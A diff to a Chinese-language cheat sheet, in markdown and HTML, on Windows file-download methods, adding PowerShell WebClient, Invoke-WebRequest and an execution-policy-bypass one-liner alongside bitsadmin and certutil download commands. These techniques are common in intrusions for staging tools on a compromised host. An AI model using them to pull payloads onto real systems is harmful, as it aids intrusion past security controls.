@@ -121,10 +121,23 @@ bitsadmin /rawreturn /transfer getfile http://192.168.1.100/test.txt C:\test.txt
 
 ## powershell
 
-
 ```
 $client = new-object System.Net.WebClient
 $client.DownloadFile('http://192.168.1.100/test.txt', 'C:\test.txt')
+```
+
+powershell 3.0 提供了  `Invoke-WebRequest` 方法
+
+需要绝对路径
+
+```
+Invoke-WebRequest -Uri http://192.168.1.100/test.txt -OutFile C:\test.txt
+```
+
+或者一句话执行
+
+```
+powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://192.168.1.100/test.txt','C:\test.txt')
 ```
 
 ## wget
@@ -295,6 +308,18 @@ certutil -urlcache -split -f http://192.168.1.100/test.txt C:\test.txt delete
 
 <pre><code>$client = new-object System.Net.WebClient
 $client.DownloadFile('http://192.168.1.100/test.txt', 'C:\test.txt')
+</code></pre>
+
+<p>powershell 3.0 提供了  <code>Invoke-WebRequest</code> 方法</p>
+
+<p>需要绝对路径</p>
+
+<pre><code>Invoke-WebRequest -Uri http://192.168.1.100/test.txt -OutFile C:\test.txt
+</code></pre>
+
+<p>或者一句话执行</p>
+
+<pre><code>powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://192.168.1.100/test.txt','C:\test.txt')
 </code></pre>
 
 <h2 id="wget">wget</h2>
